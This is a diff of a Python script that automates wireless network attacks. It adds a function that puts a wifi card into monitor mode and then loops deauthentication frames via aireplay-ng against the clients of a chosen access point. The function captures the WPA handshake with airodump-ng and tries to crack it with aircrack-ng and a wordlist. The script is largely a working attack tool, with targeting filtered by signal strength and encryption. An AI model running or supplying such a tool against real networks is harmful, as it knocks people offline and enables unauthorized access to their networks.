@@ -1,4 +1,4 @@
-#! /usr/bin/python3
+ #! /usr/bin/python3
 # Program for the device
 # Started August
 # Yordan
@@ -7,14 +7,16 @@ import os
 import time
 import csv
 import signal
+from multiprocessing import Process
     # AP & Associated client=>
     # AP - BSSID, ESSID, PWR, ENC, CIPHER, AUTH
     # Associated client - Connected BSSID, STATION
 class AccessPoint():
     """AccessPoint"""
-    def __init__(self,BSSID, ESSID, PWR, ENC, CIPHER, AUTH):
+    def __init__(self,BSSID, ESSID, Channel, PWR, ENC, CIPHER, AUTH):
         self.BSSID = BSSID
         self.ESSID = ESSID
+        self.Channel = Channel
         self.PWR = PWR
         self.ENC = ENC
         self.CIPHER = CIPHER
@@ -31,6 +33,9 @@ class AccessPoint():
 
     def get_PWR(self):
         return self.PWR
+
+    def get_Channel(self):
+        return self.Channel
 
 class AssociatedClient():
     """AssociatedClient"""
@@ -58,16 +63,62 @@ def shutting_down_monitor_mode(name):
     print("Goodbye, little fellow...")
     return
 
-#We need the range to be closer
-def check_range(power):
-    return abs(power) <= 60
+def monitor_mode(name):
+    print("Setting up your device...")
+    subprocess_command('ifconfig ' + name + ' up')
+    print("All set up, now we will continue into monitor mode...")
+    monitor_mode_wlan = subprocess_command('airmon-ng start ' + name + ' | grep \'monitor mode\' | cut -d \']\' -f 3 | cut -d \')\' -f 1 ')
+    print("Monitor mode successfully put up - " + monitor_mode_wlan)
+    return monitor_mode_wlan
+
+
+
+def capture_handshake(monitor_mode, point, filtered_clients):
+    #airodump-ng --bssid A0:F3:C1:3D:40:F6 --channel 1 -w smth wlan0mon
+    # thread ( may help )
+    subprocess_command('rm hands* raven/temp.lst')
+
+    argum = 'airodump-ng --bssid ' + point.get_BSSID() + ' --channel ' +  point.get_Channel() + ' -w handshake ' + monitor_mode
+    # process = Process(target=airodump_smth,args=(argum,))
+
+    command = subprocess.Popen(argum,  stdout=subprocess.PIPE,
+                                       stderr=subprocess.PIPE,
+                                       shell=True,
+                                       preexec_fn=os.setsid)
+    subprocess_command('echo \"temp\" >> raven/temp.lst')
+
+    while True:
+        time.sleep(2)
+        for client in filtered_clients:
+
+            command_process = subprocess.Popen('aireplay-ng  --deauth 1 -a ' + point.get_BSSID() + ' -c '+ client.get_Station()+ ' ' +  monitor_mode + ' --ignore-negative-one',stdout=subprocess.PIPE,
+                                                                                                                                                                    shell=True)
+            command_process.wait()
+            print(command_process.communicate()[0])
+
+        smth = subprocess.Popen('aircrack-ng -a 2 -w raven/temp.lst -b ' + point.get_BSSID() + ' handshake-01.cap',stdout=subprocess.PIPE,
+                                                                                                                   stderr=subprocess.PIPE,
+                                                                                                                   shell=True)
+        smth.wait()
+        other = smth.communicate()[0]
+        print(other)
+        if other.decode("utf-8").find("Passphrase not in dictionary") != -1:
+            try:
+                os.kill(command.pid, signal.SIGTERM)
+
+                print("Yeah, bby")
+                return
+            except OSError:
+                pass
+            except UnboundLocalError:
+                pass
+
 
 def csv_parser(file_pos):
 
     ap = []
     assoc_clients = []
     is_ap = False
-    place = 0
 
     with open(file_pos, 'r') as csvfile:
         liner = csv.reader(csvfile, delimiter=',')
@@ -78,18 +129,18 @@ def csv_parser(file_pos):
                 is_ap = True
                 continue
             if line[0].strip() == 'Station MAC':
-                place = 0
                 is_ap = False
                 continue
             if is_ap:
                 accessP = AccessPoint(line[0].strip(),
                                       line[13].strip(),
+                                      line[3].strip(),
                                       line[8].strip(),
                                       line[5].strip(),
                                       line[6].strip(),
                                       line[7].strip())
-                if int(line[4].strip()) != -1:
 
+                if int(line[4].strip()) != -1:
                     if abs(int(accessP.get_PWR())) < 60:
                         if accessP.get_ENC() != 'OPN' or accessP.get_ENC() != '':
                             ap.append(accessP)
@@ -103,7 +154,7 @@ def csv_parser(file_pos):
 def airodump(monitor_mode, file_directory):
         process = subprocess.Popen('airodump-ng -a -w '+file_directory+'raven --output-format csv '+monitor_mode, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, preexec_fn=os.setsid)
 
-        time.sleep(7)
+        time.sleep(15)
 
         try:
             os.kill(process.pid, signal.SIGTERM)
@@ -131,10 +182,10 @@ def airodump(monitor_mode, file_directory):
             else:
                 if not filtered_clients:
                     print("Cannot run the attack - no clients on the run")
-                    return
                 else:
                     print("Algorithm for WPA")
-                    
+                    capture_handshake(monitor_mode, point, filtered_clients)
+
             is_WEP = False
 
 
@@ -155,11 +206,8 @@ try:
     print("Your wlan card name is " + wlan_name)
 
     #Second stage - setting it into monitor mode
-    print("Setting up your device...")
-    subprocess_command('ifconfig ' + wlan_name + ' up')
-    print("All set up, now we will continue into monitor mode...")
-    monitor_mode_wlan = subprocess_command('airmon-ng start ' + wlan_name + ' | grep \'monitor mode\' | cut -d \']\' -f 3 | cut -d \')\' -f 1')
-    print("Monitor mode successfully put up - " + monitor_mode_wlan)
+
+    wlan_name = monitor_mode(wlan_name)
 
     #third stage - checking for directory and scanning
     print("Checking for existing directory...")
@@ -170,8 +218,8 @@ try:
         subprocess_command('rm -rf ' + file_directory + 'raven*')
 
     print("Starting scanning...")
-    airodump(monitor_mode_wlan,file_directory)
+    airodump(wlan_name,file_directory)
 
-    shutting_down_monitor_mode(monitor_mode_wlan)
+    shutting_down_monitor_mode(wlan_name)
 except KeyboardInterrupt:
-    shutting_down_monitor_mode(monitor_mode_wlan)
+    shutting_down_monitor_mode(wlan_name)
